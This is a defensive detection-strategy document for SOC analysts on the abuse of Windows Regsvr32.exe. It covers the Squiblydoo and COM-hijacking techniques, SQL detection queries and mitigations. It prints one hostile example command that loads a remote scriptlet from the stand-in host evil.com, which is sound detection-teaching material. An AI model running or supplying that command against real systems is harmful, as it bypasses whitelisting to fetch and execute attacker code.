### Alerting and Detection Strategy (ADS) for Malicious Use of Regsvr32 in Windows Environments

#### Overview

- **ADS ID**: ADS-2023-001
- **Title**: Detecting Malicious Use of Regsvr32 in Windows
- **Last Modified**: September 3, 2023
- **Version**: 1.0
- **Related ATT&CK Technique**: [T1218.010 - Regsvr32](https://attack.mitre.org/techniques/T1218/010/)
- **Author**: Cybersecurity Team

#### Objective

To provide a comprehensive guide for detecting malicious activities involving the use of `Regsvr32.exe` in Windows environments. This document aims to educate both junior and senior cybersecurity analysts in Security Operations Centers (SOCs) on the intricacies of `Regsvr32.exe` and how it can be abused.

#### Technical Context

##### What is Regsvr32?

`Regsvr32.exe` is a command-line utility in Windows used for registering and unregistering Object Linking and Embedding (OLE) controls, including Dynamic Link Libraries (DLLs). It is commonly located in `C:\\Windows\\System32\\`.

##### Legitimate Usage

In a legitimate context, `Regsvr32` is often used by administrators and software installers to register DLLs or ActiveX controls in the Windows Registry. The typical syntax for legitimate usage is:

\`\`\`bash
Regsvr32.exe /s /i somefile.dll
\`\`\`

##### Malicious Usage

###### Squiblydoo Attack

One of the most notorious techniques involving `Regsvr32` is the Squiblydoo attack. It allows an attacker to bypass application whitelisting defenses by loading a COM scriptlet from a remote server. The syntax is:

\`\`\`bash
Regsvr32.exe /u /n /s /i:http://evil.com/malicious.sct scrobj.dll
\`\`\`

###### COM Object Hijacking

`Regsvr32` can also be used to register a malicious COM Object for persistence via Component Object Model Hijacking.

###### Examples

- APT32 used `Regsvr32` to execute a COM scriptlet that dynamically downloaded a backdoor.
- Cobalt Group used `Regsvr32.exe` to execute scripts.

#### Data Sources

- Windows Event Logs
- Network Traffic Logs
- Endpoint Detection and Response (EDR) Logs

#### Detection Strategy

##### Indicators of Compromise (IoCs)

- Unusual network connections initiated by `Regsvr32.exe`.
- Registration or unregistration of suspicious or unknown DLLs.

##### Analytics

**Generic Regsvr32 Detection**

\`\`\`sql
SELECT * FROM process_events WHERE parent_process_name = 'regsvr32.exe' AND process_name != 'regsvr32.exe';
\`\`\`

**Squiblydoo Detection**

\`\`\`sql
SELECT * FROM process_events WHERE process_name = 'regsvr32.exe' AND command_line LIKE '%scrobj.dll%';
\`\`\`

#### Mitigations

- Use application control tools like Windows Defender Application Control to block unauthorized usage of `Regsvr32`.
- Employ network segmentation and firewall rules to restrict `Regsvr32` from making outbound connections.

#### References

- [MITRE ATT&CK: Regsvr32](https://attack.mitre.org/techniques/T1218/010/)
- [Red Canary: Technique T1117](https://redcanary.com/blog/3-technique-regsvr32-t1117/)
- [LOLBAS Project: Regsvr32](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/)
- [iRed Team: T1117 Regsvr32 aka Squiblydoo](https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo)

---

This document is intended to be a living resource. As new techniques and tactics are developed by adversaries, this ADS will be updated to reflect those changes.
